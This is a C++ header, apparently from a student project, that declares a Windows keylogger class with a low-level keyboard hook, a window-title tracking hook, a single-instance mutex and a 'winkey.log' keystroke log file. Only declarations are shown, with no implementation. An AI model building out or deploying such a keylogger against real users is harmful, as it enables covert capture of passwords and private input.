#ifndef WINKEY_H
# define WINKEY_H

# include <windows.h>
# include <iostream>
# include <fstream>
# include <string>
# include <iomanip>			// For std::setw and std::setfill
# include <thread>			// For sleep_for

# define TW_MUTEX_NAME		"TYYghhTYU5678FuGHFGFHYFUIY67"
# define TW_LOGFILE			"winkey.log"
# define TW_MAX_SAME_VK		10	// Max amount of repetitive vkCode

class	Winkey
{
	public:

		Winkey();
		~Winkey();

		void	run();

	private:

		void					setHooks();
		static void				logToFile();

		static LRESULT CALLBACK	lowLevelKeyboardProc(
			const int nCode, const WPARAM wParam, const LPARAM lParam
		);
		static void CALLBACK	winEventProc(
			const HWINEVENTHOOK /*hWinEventHook*/, const DWORD event, const HWND hwnd,
			LONG /*idObject*/, LONG /*idChild*/, DWORD /*dwEventThread*/, DWORD /*dwmsEventTime*/
		);

		const char				*_logFileName;
		static std::wofstream	_logFile;
		static wchar_t			_windowTitle[256];
		static HWND				_currentWindow;
		static std::wstring		_keyStroke;
		HANDLE					_singleInstanceMutex;
		HWINEVENTHOOK			_winEventHook;
		HHOOK   				_keyboardHook;
};

class	InstanceAlreadyRunnningException: public std::exception {
	public:
		InstanceAlreadyRunnningException() noexcept {}
		virtual const char	*what() const noexcept {
			return "Another instance of this program is already running.";
		}
		virtual ~InstanceAlreadyRunnningException() noexcept {}
};

class	FileOpenFailureException: public std::exception {
	public:
		FileOpenFailureException() noexcept {}
		virtual const char	*what() const noexcept {
			return "Failed to open log file.";
		}
		virtual ~FileOpenFailureException() noexcept {}
};

class	HookSettingFailureException: public std::exception {
	public:
		HookSettingFailureException() {}
		virtual const char	*what() const noexcept {
			return "Failed to set event hook.";
		}
		virtual ~HookSettingFailureException() noexcept {}
	private:
		const char	*_msg;
};

std::wstring	getKeyName(const UINT vkCode);

#endif